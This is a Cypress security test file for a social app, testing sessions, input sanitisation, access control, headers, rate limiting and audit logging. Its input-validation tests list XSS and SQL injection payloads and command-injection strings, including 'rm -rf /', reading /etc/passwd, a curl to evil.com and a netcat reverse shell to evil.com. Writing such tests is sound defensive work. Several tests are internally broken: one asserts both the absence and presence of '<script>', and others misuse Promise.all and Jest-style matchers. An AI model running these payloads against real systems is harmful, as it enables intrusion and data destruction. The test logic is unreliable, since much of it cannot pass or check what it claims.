describe('Security Testing', () => {
  const userA = { username: 'sec_user_a', email: 'sec_a@focus.com', password: 'password123' }
  const userB = { username: 'sec_user_b', email: 'sec_b@focus.com', password: 'password123' }

  before(() => {
    cy.task('setupTestUsers', [userA, userB])
  })

  after(() => {
    cy.task('cleanupTestUsers', [userA, userB])
  })

  describe('Authentication Security', () => {
    it('should prevent unauthorized access', () => {
      // Try to access protected routes without authentication
      cy.visit('/home')
      cy.url().should('include', '/auth')

      cy.visit('/profile')
      cy.url().should('include', '/auth')

      cy.visit('/messages')
      cy.url().should('include', '/auth')
    })

    it('should handle session expiration', () => {
      cy.switchUserSession(userA.username)
      cy.visit('/home')

      // Simulate session expiration
      cy.window().then((win) => {
        win.localStorage.removeItem('focus-session-token')
      })

      cy.reload()
      cy.url().should('include', '/auth')
      cy.get('[data-testid="session-expired"]').should('be.visible')
    })

    it('should prevent session fixation', () => {
      // Login with one session
      cy.session('session-1', () => {
        cy.visit('/auth')
        cy.get('[data-testid="email-input"]').type(userA.email)
        cy.get('[data-testid="password-input"]').type(userA.password)
        cy.get('[data-testid="login-button"]').click()
        cy.url().should('include', '/home')
      })

      // Try to use same session in different context
      cy.session('session-2', () => {
        cy.visit('/auth')
        cy.get('[data-testid="email-input"]').type(userA.email)
        cy.get('[data-testid="password-input"]').type(userA.password)
        cy.get('[data-testid="login-button"]').click()
        cy.url().should('include', '/home')
      })

      // Sessions should be independent
      cy.session('session-1', () => {
        cy.get('[data-testid="current-user"]').should('contain', userA.username)
      })

      cy.session('session-2', () => {
        cy.get('[data-testid="current-user"]').should('contain', userA.username)
      })
    })

    it('should enforce password complexity', () => {
      cy.visit('/auth')
      cy.get('[data-testid="register-link"]').click()

      // Try weak passwords
      cy.get('[data-testid="email-input"]').type('weak@example.com')
      cy.get('[data-testid="password-input"]').type('123')
      cy.get('[data-testid="register-button"]').click()
      cy.get('[data-testid="password-error"]').should('contain', 'Password too weak')

      cy.get('[data-testid="password-input"]').clear().type('password')
      cy.get('[data-testid="register-button"]').click()
      cy.get('[data-testid="password-error"]').should('contain', 'Must contain numbers and symbols')
    })
  })

  describe('Input Validation and Sanitization', () => {
    it('should prevent XSS attacks', () => {
      const xssPayloads = [
        '<script>alert("xss")</script>',
        '<img src=x onerror=alert(1)>',
        'javascript:alert("xss")',
        '<iframe src="javascript:alert(1)"></iframe>',
        '<svg onload=alert(1)>'
      ]

      cy.switchUserSession(userA.username)
      cy.visit('/create')

      xssPayloads.forEach(payload => {
        cy.get('[data-testid="post-caption"]').clear().type(payload)
        cy.get('[data-testid="publish-post"]').click()

        // Should be sanitized
        cy.get('[data-testid="feed-container"]').should('not.contain', '<script>')
        cy.get('[data-testid="feed-container"]').should('not.contain', '<img')
        cy.get('[data-testid="feed-container"]').should('contain', '<script>')
      })
    })

    it('should prevent SQL injection', () => {
      const sqlPayloads = [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "'; SELECT * FROM users; --",
        "admin'--",
        "1' OR '1' = '1"
      ]

      cy.switchUserSession(userA.username)
      cy.visit('/search')

      sqlPayloads.forEach(payload => {
        cy.get('[data-testid="search-input"]').clear().type(payload)
        cy.get('[data-testid="search-button"]').click()

        // Should not crash or return unauthorized data
        cy.get('[data-testid="error-message"]').should('not.exist')
        cy.url().should('include', '/search')
      })
    })

    it('should validate file uploads', () => {
      cy.switchUserSession(userA.username)
      cy.visit('/create')

      // Try to upload malicious files
      const maliciousFiles = [
        'malicious.exe',
        'script.js',
        'dangerous.php',
        'large-file.zip'
      ]

      maliciousFiles.forEach(filename => {
        cy.get('[data-testid="file-input"]').selectFile({
          contents: Cypress.Buffer.from('malicious content'),
          fileName: filename,
          mimeType: 'application/octet-stream'
        }, { force: true })

        cy.get('[data-testid="upload-error"]').should('be.visible')
      })

      // Valid image upload should work
      cy.get('[data-testid="file-input"]').selectFile('cypress/fixtures/test-image.jpg')
      cy.get('[data-testid="upload-success"]').should('be.visible')
    })

    it('should prevent command injection', () => {
      // Try command injection in URLs or inputs
      const commandPayloads = [
        '; rm -rf /',
        '| cat /etc/passwd',
        '`whoami`',
        '$(curl http://evil.com)',
        '| nc -e /bin/sh evil.com 4444'
      ]

      cy.switchUserSession(userA.username)

      commandPayloads.forEach(payload => {
        // Try in search
        cy.visit('/search')
        cy.get('[data-testid="search-input"]').type(payload)
        cy.get('[data-testid="search-button"]').click()

        // Should not execute commands
        cy.get('[data-testid="command-executed"]').should('not.exist')
      })
    })
  })

  describe('Authorization and Access Control', () => {
    it('should enforce user permissions', () => {
      cy.switchUserSession(userA.username)
      cy.visit('/home')

      // Create a private post
      cy.visit('/create')
      cy.get('[data-testid="post-caption"]').type('Private post for testing')
      cy.get('[data-testid="privacy-select"]').select('private')
      cy.get('[data-testid="publish-post"]').click()

      // User B should not see private post
      cy.switchUserSession(userB.username)
      cy.visit('/home')
      cy.get('[data-testid="feed-container"]').should('not.contain', 'Private post for testing')

      // User B should not be able to access private post URL
      cy.switchUserSession(userA.username)
      cy.get('[data-testid="post-link"]').first().invoke('attr', 'href').as('privatePostUrl')

      cy.switchUserSession(userB.username)
      cy.get('@privatePostUrl').then((url) => {
        cy.visit(url)
        cy.get('[data-testid="access-denied"]').should('be.visible')
      })
    })

    it('should prevent privilege escalation', () => {
      // Try to access admin functions as regular user
      cy.switchUserSession(userA.username)

      const adminEndpoints = [
        '/admin/users',
        '/admin/analytics',
        '/admin/settings',
        '/api/admin/delete-user'
      ]

      adminEndpoints.forEach(endpoint => {
        cy.request({
          url: endpoint,
          failOnStatusCode: false
        }).then((response) => {
          expect(response.status).to.be.oneOf([401, 403, 404])
        })
      })

      // Try to modify other users' data
      cy.request({
        method: 'PUT',
        url: `/api/users/${userB.username}`,
        body: { email: 'hacked@example.com' },
        failOnStatusCode: false
      }).then((response) => {
        expect(response.status).to.be.oneOf([401, 403])
      })
    })

    it('should validate API permissions', () => {
      cy.switchUserSession(userA.username)

      // Try to access other users' private data via API
      cy.request({
        url: `/api/users/${userB.username}/private-data`,
        failOnStatusCode: false
      }).then((response) => {
        expect(response.status).to.be.oneOf([401, 403, 404])
      })

      // Try to delete other users' posts
      cy.request({
        method: 'DELETE',
        url: `/api/posts/${userB.username}/post-123`,
        failOnStatusCode: false
      }).then((response) => {
        expect(response.status).to.be.oneOf([401, 403, 404])
      })
    })
  })

  describe('Data Protection', () => {
    it('should encrypt sensitive data', () => {
      cy.switchUserSession(userA.username)
      cy.visit('/messages')

      // Send a message
      cy.get('[data-testid="message-input"]').type('Sensitive message')
      cy.get('[data-testid="send-message"]').click()

      // Check that message is encrypted in storage/network
      cy.intercept('POST', '**/messages', (req) => {
        // Message should be encrypted before sending
        expect(req.body.content).not.to.equal('Sensitive message')
        expect(req.body.encrypted).to.be.true
      }).as('sendMessage')

      cy.wait('@sendMessage')
    })

    it('should handle PII properly', () => {
      // Test with user data containing PII
      const userWithPII = {
        username: 'pii_test',
        email: 'test@example.com',
        phone: '+1234567890',
        ssn: '123-45-6789'
      }

      cy.task('setupTestUsers', [userWithPII])

      cy.switchUserSession(userWithPII.username)
      cy.visit('/profile/edit')

      // PII fields should be masked or encrypted
      cy.get('[data-testid="phone-input"]').should('have.attr', 'type', 'password')
      cy.get('[data-testid="ssn-input"]').should('not.exist') // Should not be stored

      // API calls should not expose PII
      cy.intercept('GET', '**/profile', (req) => {
        // Response should not contain sensitive PII
        req.on('response', (res) => {
          expect(res.body.phone).to.be.undefined
          expect(res.body.ssn).to.be.undefined
        })
      })

      cy.reload()

      cy.task('cleanupTestUsers', [userWithPII])
    })

    it('should implement proper data retention', () => {
      cy.switchUserSession(userA.username)

      // Create content
      cy.visit('/create')
      cy.get('[data-testid="post-caption"]').type('Temporary post')
      cy.get('[data-testid="publish-post"]').click()

      // Fast-forward time (simulate)
      cy.task('advanceTime', { days: 365 })

      // Old content should be archived or deleted
      cy.visit('/profile')
      cy.get('[data-testid="archived-posts"]').should('contain', 'Temporary post')

      // Or completely removed
      cy.get('[data-testid="deleted-posts-notice"]').should('be.visible')
    })
  })

  describe('Network Security', () => {
    it('should use HTTPS everywhere', () => {
      cy.switchUserSession(userA.username)
      cy.visit('/home')

      // All requests should be HTTPS
      cy.intercept('*', (req) => {
        expect(req.url).to.match(/^https:\/\//)
      })

      // Check mixed content warnings
      cy.get('img[src^="http:"]').should('not.exist')
      cy.get('script[src^="http:"]').should('not.exist')
      cy.get('link[href^="http:"]').should('not.exist')
    })

    it('should implement CSP headers', () => {
      cy.request('/').then((response) => {
        expect(response.headers).to.have.property('content-security-policy')
        const csp = response.headers['content-security-policy']
        expect(csp).to.include("default-src 'self'")
        expect(csp).to.include("script-src 'self'")
        expect(csp).to.include("style-src 'self'")
      })
    })

    it('should prevent clickjacking', () => {
      // Check for X-Frame-Options or CSP frame-ancestors
      cy.request('/').then((response) => {
        const hasXFrameOptions = response.headers['x-frame-options']
        const csp = response.headers['content-security-policy']

        expect(hasXFrameOptions || (csp && csp.includes('frame-ancestors'))).to.be.true
      })

      // Try to load in iframe (should be blocked)
      cy.visit('/iframe-test')
      cy.get('[data-testid="iframe-blocked"]').should('be.visible')
    })

    it('should handle CORS properly', () => {
      // Test cross-origin requests
      cy.request({
        url: 'https://evil.com/attack',
        failOnStatusCode: false
      }).then((response) => {
        expect(response.status).to.be.oneOf([0, 404, 403]) // Should be blocked
      })

      // Valid API calls should work
      cy.switchUserSession(userA.username)
      cy.request('/api/profile').then((response) => {
        expect(response.status).to.equal(200)
      })
    })
  })

  describe('Rate Limiting and DoS Protection', () => {
    it('should implement rate limiting', () => {
      cy.switchUserSession(userA.username)

      // Send many requests rapidly
      const requests = []
      for (let i = 0; i < 100; i++) {
        requests.push(
          cy.request({
            method: 'POST',
            url: '/api/likes',
            body: { postId: 'test-post' },
            failOnStatusCode: false
          })
        )
      }

      cy.wrap(Promise.all(requests)).then((responses) => {
        const rateLimited = responses.filter(r => r.status === 429).length
        const successful = responses.filter(r => r.status === 200).length

        // Should have rate limiting
        expect(rateLimited).to.be.greaterThan(0)
        expect(successful).to.be.lessThan(100)
      })
    })

    it('should prevent brute force attacks', () => {
      // Try many login attempts
      for (let i = 0; i < 10; i++) {
        cy.request({
          method: 'POST',
          url: '/auth/login',
          body: {
            email: userA.email,
            password: 'wrongpassword'
          },
          failOnStatusCode: false
        }).then((response) => {
          if (i < 5) {
            expect(response.status).to.equal(401)
          } else {
            expect(response.status).to.equal(429) // Rate limited
          }
        })
      }
    })

    it('should handle large payload attacks', () => {
      const largePayload = 'x'.repeat(1000000) // 1MB payload

      cy.request({
        method: 'POST',
        url: '/api/posts',
        body: { content: largePayload },
        failOnStatusCode: false
      }).then((response) => {
        expect(response.status).to.be.oneOf([400, 413]) // Bad request or payload too large
      })
    })
  })

  describe('Session Security', () => {
    it('should use secure session cookies', () => {
      cy.switchUserSession(userA.username)
      cy.visit('/home')

      // Check cookie attributes
      cy.getCookie('focus-session').then((cookie) => {
        expect(cookie).to.have.property('secure', true)
        expect(cookie).to.have.property('httpOnly', true)
        expect(cookie).to.have.property('sameSite', 'strict')
      })
    })

    it('should handle concurrent sessions', () => {
      // Login from multiple devices/browsers
      cy.session('device-1', () => {
        cy.visit('/auth')
        cy.get('[data-testid="email-input"]').type(userA.email)
        cy.get('[data-testid="password-input"]').type(userA.password)
        cy.get('[data-testid="login-button"]').click()
      })

      cy.session('device-2', () => {
        cy.visit('/auth')
        cy.get('[data-testid="email-input"]').type(userA.email)
        cy.get('[data-testid="password-input"]').type(userA.password)
        cy.get('[data-testid="login-button"]').click()
      })

      // Actions in one session should be visible in others
      cy.session('device-1', () => {
        cy.visit('/create')
        cy.get('[data-testid="post-caption"]').type('Cross-session post')
        cy.get('[data-testid="publish-post"]').click()
      })

      cy.session('device-2', () => {
        cy.visit('/home')
        cy.get('[data-testid="feed-container"]').should('contain', 'Cross-session post')
      })
    })

    it('should prevent session hijacking', () => {
      cy.switchUserSession(userA.username)
      cy.visit('/home')

      // Get session token
      cy.getCookie('focus-session').then((cookie) => {
        const token = cookie.value

        // Try to use token in different context
        cy.request({
          url: '/api/profile',
          headers: { 'Authorization': `Bearer ${token}` },
          failOnStatusCode: false
        }).then((response) => {
          expect(response.status).to.equal(200) // Should work in same session

          // But should fail if token is tampered
          const tamperedToken = token.slice(0, -5) + 'xxxxx'
          cy.request({
            url: '/api/profile',
            headers: { 'Authorization': `Bearer ${tamperedToken}` },
            failOnStatusCode: false
          }).then((response) => {
            expect(response.status).to.be.oneOf([401, 403])
          })
        })
      })
    })
  })

  describe('Third-party Integration Security', () => {
    it('should validate external API responses', () => {
      // Mock external API responses
      cy.intercept('GET', '**/external-api/**', { fixture: 'external-data.json' }).as('externalAPI')

      cy.switchUserSession(userA.username)
      cy.visit('/integrations')

      cy.wait('@externalAPI')

      // Should validate and sanitize external data
      cy.get('[data-testid="external-content"]').should('not.contain', '<script>')
      cy.get('[data-testid="external-content"]').should('contain', 'safe content')
    })

    it('should handle OAuth securely', () => {
      cy.switchUserSession(userA.username)
      cy.visit('/settings/integrations')

      // OAuth flow should be secure
      cy.get('[data-testid="connect-twitter"]').click()
      cy.url().should('include', 'twitter.com/oauth')

      // Should not expose sensitive data in URL
      cy.url().should('not.include', 'client_secret')
      cy.url().should('not.include', 'access_token')
    })

    it('should prevent external resource loading vulnerabilities', () => {
      // Try to load external resources that could be malicious
      const maliciousUrls = [
        'data:text/html,<script>alert(1)</script>',
        'javascript:alert(1)',
        'vbscript:msgbox(1)'
      ]

      maliciousUrls.forEach(url => {
        cy.request({
          url: `/api/proxy?url=${encodeURIComponent(url)}`,
          failOnStatusCode: false
        }).then((response) => {
          expect(response.status).to.be.oneOf([400, 403, 404])
        })
      })
    })
  })

  describe('Audit Logging', () => {
    it('should log security events', () => {
      // Trigger security events
      cy.request({
        method: 'POST',
        url: '/auth/login',
        body: { email: userA.email, password: 'wrongpassword' },
        failOnStatusCode: false
      })

      // Check audit logs
      cy.task('checkAuditLogs').then((logs) => {
        expect(logs).to.include.something.like({
          event: 'failed_login_attempt',
          user: userA.email,
          ip: expect.any(String),
          timestamp: expect.any(String)
        })
      })
    })

    it('should log admin actions', () => {
      // Simulate admin action (if user has admin role)
      cy.switchUserSession(userA.username)
      cy.visit('/admin/users')

      cy.get('[data-testid="delete-user"]').first().click()
      cy.get('[data-testid="confirm-delete"]').click()

      // Check admin action was logged
      cy.task('checkAuditLogs').then((logs) => {
        expect(logs).to.include.something.like({
          event: 'user_deleted',
          admin: userA.username,
          target: expect.any(String),
          timestamp: expect.any(String)
        })
      })
    })
  })
})
